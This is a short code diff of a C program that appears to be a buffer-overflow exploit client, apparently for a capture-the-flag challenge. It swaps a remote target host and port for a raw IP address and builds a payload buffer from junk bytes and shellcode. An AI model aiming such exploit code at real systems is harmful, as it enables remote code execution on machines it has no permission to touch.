@@ -21,8 +21,8 @@ int main(int argc, char *argv[]) {
     unsigned int PORT = 9999;
     unsigned char *HOST = "127.0.0.1";
     */
-    unsigned int PORT = 30002;
-    unsigned char *HOST = "www.sniperoj.cn";
+    unsigned int PORT = 30000;
+    unsigned char *HOST = "198.199.107.165";
 
     unsigned char payload[JUNK_SIZE + WORD_LENGTH + sizeof(shellcode)] = {0};
     printf("[+] Payload length : %d\n", sizeof(payload));
